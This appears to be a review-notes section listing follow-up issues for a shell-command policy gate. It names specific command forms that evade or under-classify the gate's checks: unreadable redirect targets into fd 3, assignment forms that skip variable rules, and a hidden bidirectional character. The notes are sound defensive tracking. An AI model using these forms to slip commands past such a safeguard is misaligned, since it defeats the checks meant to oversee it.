- By / date: Eduard Ralph / 2026-10-23

## 10. Act candidates (hints for the next Act review)
- Plan advisory: 8 finding(s); brief revised: yes (plan-advisory-*.md)
- (empty is the common case)
- Follow-up (#196 sign-off): hidden-character check rejects inside quotes too (`echo '‮'`), stricter than policy-gate/v1 §1.1 — no issue owns the spec edit; file one.
- Follow-up (#196 sign-off): redirect targets the gate cannot read (`>$F`, `>/proc/$$/fd/3`, `>~/../dev/fd/3`, `cd /dev/fd; >3`) reach fd 3 but are only `mutating` — no issue owns the policy; file one.
- Follow-up (#196 sign-off): assignments without a `variable_assignment` node (`for PATH in`, `${PATH:=…}`, `((…))`) skip §3/§5 — no issue owns them; file one.
- Follow-up (#196 sign-off): #196 adds an "unknown" stdin source for function bodies — #197 and #198 briefs need one line each on treating it as the worst case (pipe for sudo-pipe/decision B; terminal for the terminal-read rule).
